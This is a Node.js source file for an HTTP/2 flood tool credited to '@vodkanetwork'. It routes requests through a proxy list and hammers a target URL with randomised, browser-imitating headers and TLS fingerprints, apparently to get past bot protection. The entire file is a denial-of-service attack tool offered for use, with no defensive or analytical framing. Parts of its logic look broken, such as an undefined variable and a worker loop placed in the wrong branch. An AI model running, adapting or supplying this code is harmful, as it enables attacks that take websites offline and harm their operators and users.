const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const colors = require("colors");

const randomUseragent = require('random-useragent');
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
function getRandomTLSCiphersuite() {
  const tlsCiphersuites = [
    'TLS_AES_128_CCM_8_SHA256',
	'TLS_AES_128_CCM_SHA256',
	'TLS_AES_256_GCM_SHA384',
	'TLS_AES_128_GCM_SHA256',
  ];

  const randomCiphersuite = tlsCiphersuites[Math.floor(Math.random() * tlsCiphersuites.length)];

  return randomCiphersuite;
}

const randomTLSCiphersuite = getRandomTLSCiphersuite();

  const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
    'text/html; charset=utf-8',
    'application/json, text/plain, */*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
  ],

  cache_header = [
    'max-age=0',
    'no-cache',
    'no-store', 
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
  ]
  const language_header = [
    'ko-KR',
    'en-US',
    'zh-CN',
    'zh-TW',
    'ja-JP',
    'en-GB',
    'en-AU',
    'en-GB,en-US;q=0.9,en;q=0.8',
    'en-GB,en;q=0.5',
    'en-CA',
    'en-UK, en, de;q=0.5',
    'en-NZ',
    'en-GB,en;q=0.6',
    'en-ZA',
    'en-IN',
    'en-PH',
    'en-SG',
    'en-HK',
    'en-GB,en;q=0.8',
    'en-GB,en;q=0.9',
    ' en-GB,en;q=0.7',
    '*',
    'en-US,en;q=0.5',
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'utf-8, iso-8859-1;q=0.5, *;q=0.1',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-GB, en-US, en;q=0.9',
    'de-AT, de-DE;q=0.9, en;q=0.5',
    'cs;q=0.5',
    'da, en-gb;q=0.8, en;q=0.7',
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'tr',
    'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
  ];
  const fetch_site = [
    "same-origin",
    "same-site",
    "cross-site",
    "none"
  ,];
  const fetch_mode = [
    "navigate",
    "same-origin",
    "no-cors",
    "cors"
  , ];
  const fetch_dest = [
    "document",
    "sharedworker",
    "subresource",
    "unknown",
    "worker", ];
  process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
] 
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt flood/bypass`); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
     input: process.argv[7]
 }
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);


 
 if (cluster.isMaster) {
  console.clear()
  console.log(`TLS-FLOOD by: @vodkanetwork (Nguyễn Lê Trí Lộc)`.rainbow)
  console.log(`--------------------------------------------`.gray)
  console.log(`Target: `.brightYellow + process.argv[2])
  console.log(`Time: `.brightYellow + process.argv[3])
  console.log(`Rate: `.brightYellow + process.argv[4])
  console.log(`Thread: `.brightYellow + process.argv[5])
  console.log(`ProxyFile: `.brightYellow + process.argv[6])   
  console.log(`TYPE: `.brightYellow + process.argv[7])   
  console.log(`--------------------------------------------`.gray)

setTimeout(() => {
    cluster.fork();
}, process.argv[3] * 1000);

if (!cluster.isMaster) {
    for (let i = 0; i < args.Rate; i++) {
        setInterval(runFlooder, randomIntn(10, 100));
    }
}
 
   
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
     const uaa = [
        '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="99"',
        '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="16"',
        '"Google Chrome";v="116", "Chromium";v="116", "Not?A_Brand";v="8"',
        '"Google Chrome";v="115", "Chromium";v="115", "Not?A_Brand";v="99"',
        '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="24"',
        '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="24"',
       ]
 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 function getRandomValue(arr) {
    const randomIndex = Math.floor(Math.random() * arr.length);
    return arr[randomIndex];
  }
  function randstra(length) {
const characters = "0123456789";
let result = "";
const charactersLength = characters.length;
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * charactersLength));
}
return result;
}
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 function randstrs(length) {
    const characters = "0123456789";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
}
const randstrsValue = randstrs(10);
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
    let interval
    	if (args.input === 'flood') {
	  interval = 700;
	} 
  else if (args.input === 'bypass') {
	  function randomDelay(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	  }
	  interval = randomDelay(500, 700);
	} else {
	  process.stdout.write('default : flood\r');
	  interval = 1000;
	}
  
  const type = [
    "text/plain",
    "text/html",
    "text/html; charset=utf-8",
    "application/json",
    "application/xml",
    "multipart/form-data",
    "application/octet-stream",
    "image/jpeg",
    "image/png",
    "audio/mpeg",
    "video/mp4",
    "application/javascript",
    "application/pdf",
    "application/vnd.ms-excel",
    "application/vnd.ms-powerpoint",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    "application/zip",
    "image/gif",
    "image/bmp",
    "image/tiff",
    "audio/wav",
    "audio/midi",
    "video/avi",
    "video/mpeg",
    "video/quicktime",
    "text/csv",
    "text/xml",
    "text/css",
    "text/javascript",
    "application/graphql",
    "application/x-www-form-urlencoded",
    "application/vnd.api+json",
    "application/ld+json",
    "application/x-pkcs12",
    "application/x-pkcs7-certificates",
    "application/x-pkcs7-certreqresp",
    "application/x-pem-file",
    "application/x-x509-ca-cert",
    "application/x-x509-user-cert",
    "application/x-x509-server-cert",
    "application/x-bzip",
    "application/x-gzip",
    "application/x-7z-compressed",
    "application/x-rar-compressed",
    "application/x-shockwave-flash"
  ];
  encoding_header = [
    'gzip, deflate, br',
    'compress, gzip',
    'deflate, gzip',
    'gzip, identity'
  ];
  function randstrr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
    function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}
const nm = [
    "110.0.0.0",
    "111.0.0.0",
    "112.0.0.0",
    "113.0.0.0",
    "114.0.0.0",
    "115.0.0.0",
    "116.0.0.0",
    "117.0.0.0",
    "118.0.0.0",
    "119.0.0.0",
    ];
    const nmx = [
    "120.0",
    "119.0",
    "118.0",
    "117.0",
    "116.0",
    "115.0",
    "114.0",
    "113.0",
    "112.0",
    "111.0",
    ];
    const nmx1 = [
    "105.0.0.0",
    "104.0.0.0",
    "103.0.0.0",
    "102.0.0.0",
    "101.0.0.0",
    "100.0.0.0",
    "99.0.0.0",
    "98.0.0.0",
    "97.0.0.0",
    ];
    const sysos = [
    "Macintosh",
    "Windows 1.01",
    "Windows 1.02",
    "Windows 1.03",
    "Windows 1.04",
    "Windows 2.01",
    "Windows 3.0",
    "Windows NT 3.1",
    "Windows NT 3.5",
    "Windows 95",
    "Windows 98",
    "Windows 2006",
    "Windows NT 4.0",
    "Windows 95 Edition",
    "Windows 98 Edition",
    "Windows Me",
    "Windows Business",
    "Windows XP",
    "Windows 7",
    "Windows 8",
    "Windows 10 version 1507",
    "Windows 10 version 1511",
    "Windows 10 version 1607",
    "Windows 10 version 1703",
    ];
    const winarch = [
    "rv:40.0",
    "rv:41.0",  
    "x86-16",
    "x86-16, IA32",
    "IA-32",
    "IA-32, Alpha, MIPS",
    "IA-32, Alpha, MIPS, PowerPC",
    "Itanium",
    "x86_64",
    "IA-32, x86-64",
    "IA-32, x86-64, ARM64",
    "x86-64, ARM64",
    "ARMv4, MIPS, SH-3",
    "ARMv4",
    "ARMv5",
    "ARMv7",
    "IA-32, x86-64, Itanium",
    "IA-32, x86-64, Itanium",
    "x86-64, Itanium",
    ];
    const winch = [
    "Intel Mac OS X 10.9",
    "Intel Mac OS X 10.7",
    "Intel Mac OS X 10_10_3",
    "Intel Mac OS X 10_10_1",
    "Intel Mac OS X 10_10_4",
    "2012 R2",
    "2019 R2",
    "2012 R2 Datacenter",
    "Server Blue",
    "Longhorn Server",
    "Whistler Server",
    "Shell Release",
    "Daytona",
    "Razzle",
    "HPC 2008",
    ];
    
     var nm1 = nm[Math.floor(Math.floor(Math.random() * nm.length))];
     var nm2 = sysos[Math.floor(Math.floor(Math.random() * sysos.length))];
     var nm3 = winarch[Math.floor(Math.floor(Math.random() * winarch.length))];
     var nm4 = nmx[Math.floor(Math.floor(Math.random() * nmx.length))];
     var nm5 = winch[Math.floor(Math.floor(Math.random() * winch.length))];
     var nm6 = nmx1[Math.floor(Math.floor(Math.random() * nmx1.length))];

     const rateHeaders = [
        { "vtl": "s-maxage=9800" },
        //{ "X-Forwarded-For": spoofed },
        { "Accept-Transfer": "gzip" },
        { "Virtual.machine": "Encode" },
        { "dnt": 1},
        { "TTL-3": "1.5" },
        { "Geo-Stats": "USA" },
        { "X-Content-type": "text/html" },
        { "origin": "https://" + parsedTarget.host + "/" },
        {"NEL" : val},
        {"Alt-Used" : parsedTarget.host},
        {"te" : "trailers" },
        { "A-IM": "Feed" },
        {'RTT': Math.floor(Math.random() * (400 - 600 + 1)) + 100},
        {'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
        {"pragma" : "no-cache"},
        {"cache-control": cache_header[Math.floor(Math.random() * cache_header.length)]},
        {"Service-Worker-Navigation-Preload" : "true"},
        {"Origin-Request" : "/" + generateRandomString(3,6)},
        { "data-return" :"false"},
        {"Supports-Loading-Mode" : "credentialed-prerender"},
        ];
const platformd = [
  "Windows",
  "Linux",
  "Android",
  "iOS",
  "Mac OS",
  "iPadOS",
  "BlackBerry OS",
  "Firefox OS",
 ];
let headers = {
  ":authority": parsedTarget.host,
  ":method": "GET",
  ":path": parsedTarget.path,
  ":scheme": "https",
  "sec-ch-ua-platform" : platformd[Math.floor(Math.random() * platformd.length)],
  "content-type" : type[Math.floor(Math.random() * type.length)],
  "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
  "sec-ch-ua" : uaa,
  "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
  "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
  "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
  "upgrade-insecure-requests" : "1",
}

 const proxyOptions = {
     host: parsedProxy[0],
     port: ~~parsedProxy[1],
     address: parsedTarget.host + ":443",
     timeout: 10
 };
 Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)
    const settings = {
       enablePush: false,
       initialWindowSize: 15564991,
   };
    const tlsOptions = {
       port: parsedPort,
       secure: true,
       ALPNProtocols: [
           "h2", 'http/1.1', "spdy/3.1"
       ],
       ciphers: ciphers,
       sigalgs: sigalgs,
       requestCert: true,
       socket: connection,
       ecdhCurve: ecdhCurve,
       honorCipherOrder: false,
       rejectUnauthorized: false,
       secureOptions: secureOptions,
       secureContext :secureContext,
       host : parsedTarget.host,
       servername: parsedTarget.host,
       secureProtocol: secureProtocol
   };
    const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 
    tlsConn.allowHalfOpen = true;
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 600000);
    tlsConn.setMaxListeners(0);
    const client = http2.connect(parsedTarget.href, {
      settings: {
        initialWindowSize: 15564991,
        maxFrameSize : 236619,
    },
    createConnection: () => tlsConn,
    socket: connection,
});
client.settings({
  initialWindowSize: 15564991,
  maxFrameSize : 236619,
});
client.setMaxListeners(0);
client.settings(settings);
    client.on("connect", () => {
       const IntervalAttack = setInterval(() => {
           for (let i = 0; i < args.Rate; i++) {
            const dynHeaders = {                 
              ...headers,    
              ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],   
            }
               const request = client.request(dynHeaders)
               const request1 = client.request(dynHeaders);
               request.end();
               request1.end();

           }
       }, interval);
      return;
    });
    client.on("close", () => {
        client.destroy();
        connection.destroy();
        return
    });
client.on("timeout", () => {
	client.destroy();
	connection.destroy();
	return
	});
  client.on("error", (error) => {
    client.destroy();
    tlsConn.destroy();
    connection.destroy();
    return
});
});
}
const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);
process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
}